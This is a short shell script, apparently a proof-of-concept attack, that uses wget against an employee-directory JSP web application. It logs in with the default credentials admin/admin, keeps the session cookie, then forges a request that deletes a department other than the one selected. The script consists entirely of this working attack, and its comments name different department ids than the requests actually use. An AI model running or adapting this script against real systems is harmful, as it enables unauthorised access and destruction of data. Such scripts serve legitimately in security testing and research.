#!/bin/sh

#get the login page
wget -a log.txt --keep-session-cookies --save-cookies cookies.txt "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/Login.jsp"

#enter login credentials 
wget -a log.txt --load-cookies cookies.txt --post-data 'FormName=Login&Login=admin&Password=admin&FormAction=login' "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/Login.jsp"

#Select a particular department(dep_id=14)
wget -a log.txt --load-cookies cookies.txt "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/DepsRecord.jsp?dep_id=21"

#Send request to delete dep_id=15 even though the selected department is dep_id=14
wget -a log.txt --load-cookies cookies.txt "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/DepsRecord.jsp?name=MaliciousDepartment&FormName=deps&FormAction=delete&dep_id=20&PK_dep_id=20"



     
